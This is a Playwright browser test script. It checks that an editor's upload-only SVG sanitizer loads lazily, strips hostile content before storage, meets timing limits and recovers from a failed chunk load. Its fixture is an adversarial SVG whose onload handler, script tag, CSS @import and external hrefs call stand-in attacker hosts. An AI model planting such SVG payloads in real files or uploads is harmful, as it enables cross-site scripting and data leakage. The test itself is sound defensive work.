#!/usr/bin/env node
/**
 * Production proof for the upload-only SVG sanitizer boundary.
 *
 * The default project and merely opening Costumes must not fetch css-tree and
 * DOMPurify. An SVG upload must fetch their named chunk exactly once, sanitize
 * before storage, render, and survive a project round trip. A second context
 * aborts that chunk once to prove the failed upload stores nothing and that
 * selecting the same file again performs a real retry.
 */
import {mkdir, mkdtemp, writeFile} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import path from 'node:path';

import {chromium} from 'playwright';

const url = process.env.PROOF_URL || 'http://localhost:8617/';
const OUT = path.resolve('artifacts/svg-sanitizer-upload');
const SANITIZER_CHUNK = /\/chunks\/svg-sanitizer(?:\.[a-f0-9]+)?\.js(?:[?#]|$)/;
const ATTACKER = /(?:attacker\.invalid|evil\.invalid)/i;
// Same-probe eager baseline: hosted run 33977434631, 65.7 ms and no long
// tasks. P13 may spend at most 15% more to fetch/parse the lazy capability.
const EAGER_UPLOAD_BASELINE_MS = 65.7;
const RELATIVE_UPLOAD_LIMIT_MS = EAGER_UPLOAD_BASELINE_MS * 1.15;
const ABSOLUTE_UPLOAD_LIMIT_MS = 1000;
const LONG_TASK_LIMIT_MS = 100;
const work = await mkdtemp(path.join(tmpdir(), 'bw-svg-sanitizer-'));
const fixture = path.join(work, 'adversarial.svg');
const saved = path.join(work, 'sanitized-svg.sb3');
const svg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="160" height="100" viewBox="0 0 160 100" onload="fetch('https://attacker.invalid/onload')">
  <script>fetch('https://attacker.invalid/script')</script>
  <style>@import url("https://attacker.invalid/leak.css"); .safe { fill: #36c; }</style>
  <image x="0" y="0" width="20" height="20" href="https://attacker.invalid/image.png" />
  <use xlink:href="https://evil.invalid/symbol.svg#mark" />
  <rect class="safe" x="10" y="10" width="140" height="80" rx="12" />
</svg>`;

await mkdir(OUT, {recursive: true});
await writeFile(fixture, svg);

let failed = 0;
const checks = [];
const record = (name, ok, detail = '') => {
    checks.push({name, ok, detail});
    console.log(`${ok ? 'PASS' : 'FAIL'}: ${name}${detail ? ` — ${detail}` : ''}`);
    if (!ok) failed++;
};

const browser = await chromium.launch({headless: true});
const makeSession = async () => {
    const context = await browser.newContext({
        viewport: {width: 1440, height: 960},
        acceptDownloads: true,
        serviceWorkers: 'block'
    });
    const page = await context.newPage();
    const sanitizerRequests = [];
    const attackerRequests = [];
    const pageErrors = [];
    page.on('request', request => {
        if (SANITIZER_CHUNK.test(request.url())) sanitizerRequests.push({url: request.url(), at: Date.now()});
        if (ATTACKER.test(request.url())) attackerRequests.push(request.url());
    });
    page.on('pageerror', error => pageErrors.push(error.message));
    await page.addInitScript(() => {
        localStorage.clear();
        sessionStorage.clear();
        localStorage.setItem('bw-starter-v1-complete', '1');
        const receipt = window.__BW_SVG_UPLOAD_PERF__ = {longTasks: []};
        if (typeof PerformanceObserver === 'function') {
            try {
                receipt.observer = new PerformanceObserver(list => {
                    for (const entry of list.getEntries()) {
                        receipt.longTasks.push({at: entry.startTime, ms: entry.duration});
                    }
                });
                receipt.observer.observe({entryTypes: ['longtask']});
            } catch { /* an empty receipt still records unsupported observers */ }
        }
    });
    await page.goto(url, {waitUntil: 'domcontentloaded', timeout: 90000});
    await page.waitForFunction(() => {
        const vm = window.__brickwrightStore?.getState?.()?.scratchGui?.vm;
        if (!vm?.runtime || !vm.editingTarget) return false;
        window.__vm = vm;
        return true;
    }, null, {timeout: 60000});
    await page.waitForLoadState('networkidle', {timeout: 20000}).catch(() => {});
    return {context, page, sanitizerRequests, attackerRequests, pageErrors};
};

const openCostumes = async page => {
    await page.getByRole('tab', {name: /Costumes?/}).first().click();
    // gate-shapes-allow: readiness precondition; upload/storage/render assertions below are the verdict.
    await page.locator('canvas[resize="true"]:visible').waitFor({state: 'visible', timeout: 30000});
    await page.getByRole('tabpanel', {name: /Costumes?/}).first()
        .locator('input[type="file"][accept*=".svg"]')
        .waitFor({state: 'attached', timeout: 30000});
};

const costumeFileInput = page => page.getByRole('tabpanel', {name: /Costumes?/}).first()
    .locator('input[type="file"][accept*=".svg"]');

const costumeState = (page, name = 'adversarial') => page.evaluate(expected => {
    const target = window.__vm.editingTarget;
    const costume = (target?.getCostumes?.() || []).find(item => item.name === expected);
    if (!costume) return {found: false};
    const bytes = costume.asset?.data;
    const text = bytes ? new TextDecoder().decode(bytes) : '';
    const skin = window.__vm.runtime.renderer?._allSkins?.[costume.skinId];
    return {
        found: true,
        count: target.getCostumes().length,
        dataFormat: costume.dataFormat,
        byteLength: bytes?.length || 0,
        text,
        skinId: costume.skinId,
        skinLoaded: Boolean(skin?._svgImageLoaded),
        size: costume.size || null
    };
}, name);

const waitForCostume = async (page, name = 'adversarial') => {
    await page.waitForFunction(expected => {
        const target = window.__vm?.editingTarget;
        const costume = (target?.getCostumes?.() || []).find(item => item.name === expected);
        if (!costume?.asset?.data?.length) return false;
        const skin = window.__vm.runtime.renderer?._allSkins?.[costume.skinId];
        return Boolean(skin?._svgImageLoaded);
    }, name, {timeout: 60000});
};

const uploadAndMeasure = async (page, file) => {
    const startedAt = await page.evaluate(() => performance.now());
    await costumeFileInput(page).setInputFiles(file);
    await waitForCostume(page);
    return page.evaluate(start => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(() => {
        const readyAt = performance.now();
        const receipt = window.__BW_SVG_UPLOAD_PERF__;
        for (const entry of receipt?.observer?.takeRecords?.() || []) {
            receipt.longTasks.push({at: entry.startTime, ms: entry.duration});
        }
        resolve({
            startedAt: start,
            readyAt,
            durationMs: readyAt - start,
            longTasks: (receipt?.longTasks || []).filter(task => task.at >= start && task.at < readyAt),
            resources: performance.getEntriesByType('resource')
                .filter(entry => SANITIZER_CHUNK.test(new URL(entry.name).pathname))
                .map(entry => ({name: new URL(entry.name).pathname, startTime: entry.startTime,
                    responseEnd: entry.responseEnd, transferSize: entry.transferSize}))
        });
    }))), startedAt);
};

const saveProject = async page => {
    await page.getByText('File', {exact: true}).click();
    const download = page.waitForEvent('download', {timeout: 60000});
    await page.getByText('Save to your computer', {exact: true}).click();
    await (await download).saveAs(saved);
};

const loadProject = async page => {
    await page.getByText('File', {exact: true}).click();
    const chooser = page.waitForEvent('filechooser', {timeout: 30000});
    await page.getByText('Load from your computer', {exact: true}).click();
    await (await chooser).setFiles(saved);
    await waitForCostume(page);
};

const receipt = {
    schema: 'brickwright/svg-sanitizer-upload/v1',
    url,
    checks,
    limits: {
        eagerBaselineMs: EAGER_UPLOAD_BASELINE_MS,
        relativeUploadMs: RELATIVE_UPLOAD_LIMIT_MS,
        absoluteUploadMs: ABSOLUTE_UPLOAD_LIMIT_MS,
        longTaskMs: LONG_TASK_LIMIT_MS
    }
};
try {
    // Successful upload and round trip.
    let session = await makeSession();
    let {context, page, sanitizerRequests, attackerRequests, pageErrors} = session;
    record('the default stage requests no SVG sanitizer chunk', sanitizerRequests.length === 0);
    await openCostumes(page);
    await page.waitForLoadState('networkidle', {timeout: 20000}).catch(() => {});
    record('opening Costumes still requests no SVG sanitizer chunk', sanitizerRequests.length === 0);

    const performance = await uploadAndMeasure(page, fixture);
    receipt.successfulUpload = performance;
    const longestUploadTask = Math.max(0, ...performance.longTasks.map(task => task.ms));
    record('first SVG upload stays within 115% of the same-probe eager baseline',
        performance.durationMs <= RELATIVE_UPLOAD_LIMIT_MS,
        `${performance.durationMs.toFixed(1)} ms <= ${RELATIVE_UPLOAD_LIMIT_MS.toFixed(3)} ms`);
    record('first SVG upload stays within the absolute one-second limit',
        performance.durationMs <= ABSOLUTE_UPLOAD_LIMIT_MS,
        `${performance.durationMs.toFixed(1)} ms <= ${ABSOLUTE_UPLOAD_LIMIT_MS} ms`);
    record('first SVG upload creates no task over 100 ms', longestUploadTask <= LONG_TASK_LIMIT_MS,
        `${longestUploadTask.toFixed(1)} ms longest task`);
    let stored = await costumeState(page);
    const uploadedTile = page.getByText('adversarial', {exact: true}).first();
    // gate-shapes-allow: synchronize React; the following record checks tile, bytes, skin, format and size.
    await uploadedTile.waitFor({state: 'visible', timeout: 30000});
    const uploadedTileVisible = await uploadedTile.isVisible();
    record('one real SVG upload requests the sanitizer chunk exactly once', sanitizerRequests.length === 1,
        sanitizerRequests.map(item => new URL(item.url).pathname).join(', ') || 'no request');
    record('the stored asset contains no script, event handler, external href, or CSS import',
        stored.found && !/<script\b/i.test(stored.text) && !/\son\w+\s*=/i.test(stored.text) &&
        !/attacker\.invalid|evil\.invalid|@import/i.test(stored.text), `${stored.byteLength || 0} sanitized bytes`);
    record('the valid rectangle remains in a visible, loaded vector costume', uploadedTileVisible &&
        /<rect\b[^>]*class=["']safe["']/i.test(stored.text) &&
        stored.skinLoaded && stored.dataFormat === 'svg' && Array.isArray(stored.size) &&
        stored.size.every(Number.isFinite), `tile=${uploadedTileVisible}, skin=${stored.skinId}, ` +
        `size=${JSON.stringify(stored.size)}`);
    record('sanitizing and rendering emitted no external attacker request', attackerRequests.length === 0,
        attackerRequests.join(', ') || 'none');
    record('the successful upload emits no uncaught page errors', pageErrors.length === 0,
        pageErrors.join(' | ') || 'clean');
    await page.screenshot({path: path.join(OUT, '01-sanitized-upload.png'), fullPage: true});
    await saveProject(page);
    await context.close();

    session = await makeSession();
    ({context, page, sanitizerRequests, attackerRequests, pageErrors} = session);
    await loadProject(page);
    await openCostumes(page);
    stored = await costumeState(page);
    const reloadedTile = page.getByRole('tabpanel', {name: /Costumes?/}).first()
        .getByText('adversarial', {exact: true}).first();
    // gate-shapes-allow: synchronize React; the following record checks the reloaded skin and stored bytes.
    await reloadedTile.waitFor({state: 'visible', timeout: 30000});
    const reloadedTileVisible = await reloadedTile.isVisible();
    record('the sanitized SVG survives save and reload visibly', reloadedTileVisible &&
        stored.skinLoaded && stored.byteLength > 0,
        `tile=${reloadedTileVisible}, ${stored.byteLength || 0} bytes, skin=${stored.skinId}`);
    record('reload does not re-run the upload-only sanitizer', sanitizerRequests.length === 0);
    record('the successful journey has no uncaught page errors', pageErrors.length === 0,
        pageErrors.join(' | ') || 'clean');
    await page.screenshot({path: path.join(OUT, '02-reloaded.png'), fullPage: true});
    await context.close();

    // Fresh failure context: abort exactly the first sanitizer chunk request.
    session = await makeSession();
    ({context, page, sanitizerRequests, attackerRequests, pageErrors} = session);
    await openCostumes(page);
    const before = await page.evaluate(() => window.__vm.editingTarget.getCostumes().length);
    await page.evaluate(() => {
        const storage = window.__vm.runtime.storage;
        const original = storage.createAsset.bind(storage);
        window.__BW_SVG_ASSET_CREATES__ = 0;
        storage.createAsset = (...args) => {
            window.__BW_SVG_ASSET_CREATES__++;
            return original(...args);
        };
    });
    let aborted = 0;
    const abortSanitizerOnce = async route => {
        if (!aborted && SANITIZER_CHUNK.test(route.request().url())) {
            aborted++;
            await route.abort('failed');
        } else {
            await route.continue();
        }
    };
    await context.route('**/*', abortSanitizerOnce);
    const requestFailed = page.waitForEvent('requestfailed', {
        predicate: request => SANITIZER_CHUNK.test(request.url()), timeout: 30000
    });
    await costumeFileInput(page).setInputFiles(fixture);
    await requestFailed;
    // Cross a rendering turn after the script element's error event so
    // webpack's rejected chunk promise and our retry-cache reset have both
    // completed before selecting the same file again.
    await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve))));
    await page.waitForFunction(expected => window.__vm.editingTarget.getCostumes().length === expected &&
        window.__BW_SVG_ASSET_CREATES__ === 0, before, {timeout: 30000});
    const failedState = await page.evaluate(() => ({
        count: window.__vm.editingTarget.getCostumes().length,
        creates: window.__BW_SVG_ASSET_CREATES__
    }));
    record('a failed sanitizer chunk stores no costume or asset', aborted === 1 &&
        failedState.count === before && failedState.creates === 0, JSON.stringify(failedState));

    await context.unroute('**/*', abortSanitizerOnce);
    await costumeFileInput(page).setInputFiles(fixture);
    await waitForCostume(page);
    const retryState = await costumeState(page);
    record('selecting the same file retries with a new request and succeeds',
        sanitizerRequests.length === 2 && retryState.skinLoaded,
        `${sanitizerRequests.length} requests, ${retryState.byteLength || 0} stored bytes`);
    record('the retry also makes no attacker request', attackerRequests.length === 0,
        attackerRequests.join(', ') || 'none');
    receipt.failureRetry = {beforeCostumes: before, aborted, sanitizerRequests, retryState,
        pageErrors, attackerRequests};
    await page.screenshot({path: path.join(OUT, '03-retry.png'), fullPage: true});
    await context.close();
} catch (error) {
    record('the SVG sanitizer browser journey ran to completion', false,
        error?.stack || error?.message || String(error));
} finally {
    await writeFile(path.join(OUT, 'svg-sanitizer-upload.json'), `${JSON.stringify(receipt, null, 2)}\n`);
    await browser.close();
}

console.log(`\n${failed ? `${failed} FAILED` : 'all checks passed'}`);
console.log(`proof: ${OUT}`);
process.exit(failed ? 1 : 0);
